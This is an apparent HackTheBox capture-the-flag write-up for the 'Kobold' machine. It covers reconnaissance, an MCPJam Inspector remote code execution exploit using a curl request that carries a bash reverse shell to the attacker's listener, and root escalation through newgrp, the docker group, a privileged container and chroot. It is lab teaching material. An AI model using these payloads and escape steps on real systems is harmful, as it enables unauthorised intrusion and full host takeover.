# Kobold — HackTheBox Writeup
**Difficulty:** Easy | **OS:** Linux | **Category:** Web / Privilege Escalation

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Subdomain Enumeration](#2-subdomain-enumeration)
3. [Foothold — CVE-2026-23744 (MCPJam Inspector RCE)](#3-foothold--cve-2026-23744-mcpjam-inspector-rce)
4. [User Flag](#4-user-flag)
5. [Privilege Escalation — operator Group → Docker](#5-privilege-escalation--operator-group--docker)
6. [Root Flag](#6-root-flag)
7. [Step-by-Step Summary](#7-step-by-step-summary)

---

## 1. Reconnaissance

Starting with a standard Nmap service/version scan against the target:

```bash
nmap -sV -sC 10.129.xx.xx
```

**Results:**

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://mcp.kobold.htb/
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
|_http-title: MCPJam Inspector
| ssl-cert: Subject: commonName=kobold.htb
| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
```

**Key findings:**
- Port 80 redirects to `https://mcp.kobold.htb/`
- Port 443 hosts an **MCPJam Inspector** application
- The TLS certificate covers `*.kobold.htb` (wildcard), indicating multiple subdomains

Add the target to `/etc/hosts`:

```bash
echo "10.129.xx.xx  kobold.htb" | sudo tee -a /etc/hosts
```

---

## 2. Subdomain Enumeration

Using `ffuf` to fuzz for additional virtual hosts under `kobold.htb`:

```bash
ffuf -u https://kobold.htb/ \
     -H "Host: FUZZ.kobold.htb" \
     -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
     -k -fs 154
```

**Results:**

```
bin   [Status: 200, Size: 24402, Words: 1218, Lines: 386]
mcp   [Status: 200, Size: 466,   Words: 57,   Lines: 15]
```

Two subdomains discovered:
- `mcp.kobold.htb` — the MCPJam Inspector interface
- `bin.kobold.htb` — likely a PrivateBin instance (based on response size)

Update `/etc/hosts` with both subdomains:

```
10.129.xx.xx   kobold.htb mcp.kobold.htb bin.kobold.htb
```

---

## 3. Foothold — CVE-2026-23744 (MCPJam Inspector RCE)

### Identifying the Vulnerability

Browsing to `https://mcp.kobold.htb` reveals **MCPJam Inspector v1.4.2**.

This version is affected by **CVE-2026-23744** ([GHSA-232v-j27c-5pp6](https://github.com/advisories/GHSA-232v-j27c-5pp6)), a Remote Code Execution vulnerability in the `/api/mcp/connect` endpoint. The endpoint accepts an arbitrary `serverConfig` object — including `command` and `args` — and executes it server-side without sanitisation.

### Setting Up the Listener

Using `penelope` as a reverse shell handler:

```bash
penelope -p 4444
```

```
[+] Listening for reverse shells on 0.0.0.0:4444
```

### Exploiting the Endpoint

Send a crafted POST request to the vulnerable endpoint, injecting a bash reverse shell via the `command`/`args` fields:

```bash
curl -k -X POST "https://mcp.kobold.htb/api/mcp/connect" \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "/bin/bash",
      "args": ["-c", "bash -i >& /dev/tcp/10.10.xx.xx/4444 0>&1"],
      "env": {}
    },
    "serverId": "exploit"
  }'
```

### Shell Received

```
[+] Got reverse shell from kobold.htb~10.129.xx.xx-Linux-x86_64
[+] Shell upgraded successfully using /usr/bin/python3!
[+] Interacting with session [1], Shell Type: PTY
```

Checking identity:

```bash
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ id
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

We are running as user `ben`, a member of the `operator` group.

---

## 4. User Flag

```bash
ben@kobold:~$ cat user.txt
```

```
[REDACTED]
```

---

## 5. Privilege Escalation — operator Group → Docker

### The `operator` Group

In older BSD/Unix systems, the `operator` group grants restricted administrative privileges — primarily for system maintenance, backups, and device access — without requiring full root access. Crucially, members of this group may be able to join other privileged groups (such as `docker`) **without a password prompt**.

### Checking SUID Binaries

```bash
ben@kobold:~$ find / -perm -u=s 2>/dev/null
```

```
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/sudo
...
```

`newgrp` is SUID and available — this allows switching to a new group in the current shell session.

### Joining the `docker` Group

```bash
ben@kobold:~$ newgrp docker
ben@kobold:~$ id
uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
```

Successfully joined the `docker` group without needing a password.

### Enumerating Running Containers

```bash
ben@kobold:~$ docker ps
```

```
CONTAINER ID   IMAGE                               COMMAND                  CREATED       STATUS
4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2   "/etc/init.d/rc.local"   4 weeks ago   Up 35 minutes
```

The `bin.kobold.htb` subdomain is backed by a **PrivateBin** container using the `privatebin/nginx-fpm-alpine:2.0.2` image.

### Escaping to Host Root via Docker

Since we have Docker group access, we can spawn a **privileged container** with the host filesystem mounted:

```bash
ben@kobold:~$ docker run -it --rm --privileged --user 0 \
  -v /:/hostfs \
  --entrypoint /bin/sh \
  privatebin/nginx-fpm-alpine:2.0.2
```

```
/var/www # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),...
```

We are now root **inside** the container with the host filesystem available at `/hostfs`.

### Chrooting into the Host

Using `chroot` to pivot into the host OS:

```bash
/var/www # chroot /hostfs /bin/bash
root@ebc34781d9a1:/# id
uid=0(root) gid=0(root) groups=0(root),...
```

We now have a **root shell on the host machine**.

---

## 6. Root Flag

```bash
root@ebc34781d9a1:~# cat root.txt
```

```
[REDACTED]
```

---

## 7. Step-by-Step Summary

### Phase 1 — Reconnaissance

| Step | Action | Result |
|------|--------|--------|
| 1 | `nmap -sV -sC 10.129.xx.xx` | Found ports 22 (SSH), 80 (HTTP→redirect), 443 (MCPJam Inspector v1.4.2) |
| 2 | Note TLS wildcard cert `*.kobold.htb` | Suggests multiple vhosts to enumerate |
| 3 | Add `10.129.xx.xx kobold.htb` to `/etc/hosts` | Base domain resolves |

### Phase 2 — Subdomain Discovery

| Step | Action | Result |
|------|--------|--------|
| 4 | `ffuf` vhost fuzzing against `kobold.htb` with `-fs 154` | Discovered `mcp.kobold.htb` and `bin.kobold.htb` |
| 5 | Add both subdomains to `/etc/hosts` | Subdomains now accessible |

### Phase 3 — Exploitation (RCE via CVE-2026-23744)

| Step | Action | Result |
|------|--------|--------|
| 6 | Browse `https://mcp.kobold.htb` → identify **MCPJam Inspector v1.4.2** | Confirms vulnerable version |
| 7 | Look up CVE-2026-23744 / GHSA-232v-j27c-5pp6 | Unauthenticated RCE via `/api/mcp/connect` endpoint — executes arbitrary OS commands via `serverConfig.command` |
| 8 | Start `penelope -p 4444` listener on VPN IP `10.10.xx.xx` | Listener ready |
| 9 | POST crafted JSON payload to `/api/mcp/connect` with bash reverse shell in `args` | Reverse PTY shell received as `ben` (uid=1001) |

### Phase 4 — User Flag

| Step | Action | Result |
|------|--------|--------|
| 10 | `cat ~/user.txt` | **User flag captured** |

### Phase 5 — Privilege Escalation

| Step | Action | Result |
|------|--------|--------|
| 11 | `id` → note `ben` is in the `operator` group | Operator group can join privileged groups without a password |
| 12 | `find / -perm -u=s 2>/dev/null` | `/usr/bin/newgrp` is SUID — allows switching groups in-session |
| 13 | `newgrp docker` | Joined `docker` group (gid=111) without password prompt |
| 14 | `docker ps` | Found running container: `privatebin/nginx-fpm-alpine:2.0.2` mapped to `bin.kobold.htb` |
| 15 | `docker run -it --rm --privileged --user 0 -v /:/hostfs --entrypoint /bin/sh privatebin/nginx-fpm-alpine:2.0.2` | Privileged container spawned with host root FS mounted at `/hostfs` |
| 16 | `chroot /hostfs /bin/bash` | **Root shell on host OS** |

### Phase 6 — Root Flag

| Step | Action | Result |
|------|--------|--------|
| 17 | `cat /root/root.txt` | **Root flag captured** |

---

## Key Takeaways

- **CVE-2026-23744** highlights the danger of exposing MCP server management APIs without authentication or input validation — arbitrary command execution is trivial.
- The **`operator` group** is a legacy Unix concept rarely hardened in modern systems; membership can silently grant access to other privileged groups like `docker`.
- **Docker group = root** — any user in the `docker` group can trivially escape to the host via a privileged container with a bind-mounted root filesystem. This is a well-known and intentional design trade-off in Docker's architecture.
- The `newgrp` SUID binary can be abused to switch into any group the user is *already a member of* (per `/etc/group`) in a single command — no password required.
